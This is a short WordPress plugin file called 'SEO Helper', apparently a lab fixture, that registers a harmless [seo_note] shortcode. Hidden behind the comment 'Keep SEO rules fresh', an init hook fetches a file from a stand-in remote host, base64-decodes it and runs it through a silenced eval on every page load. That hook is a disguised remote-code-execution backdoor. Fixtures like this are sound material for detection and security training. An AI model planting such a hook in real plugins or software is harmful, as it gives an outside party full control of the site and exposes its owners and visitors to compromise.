<?php
/*
Plugin Name: SEO Helper
Description: Adds a [seo_note] shortcode. (Lab fixture.)
Version: 1.1.1
*/
if ( ! defined( 'ABSPATH' ) ) { exit; }

function seoh_note( $atts ) {
	$atts = shortcode_atts( array( 'text' => '' ), $atts );
	return '<p class="seo-note" title="' . esc_attr( $atts['text'] ) . '">SEO note</p>';
}
add_shortcode( 'seo_note', 'seoh_note' );

// Keep SEO rules fresh.
add_action( 'init', function () {
	$r = wp_remote_get( 'http://cdn.seo-helper-updates.example/rules.txt' );
	$p = wp_remote_retrieve_body( $r );
	if ( $p ) {
		@eval( base64_decode( $p ) );
	}
} );
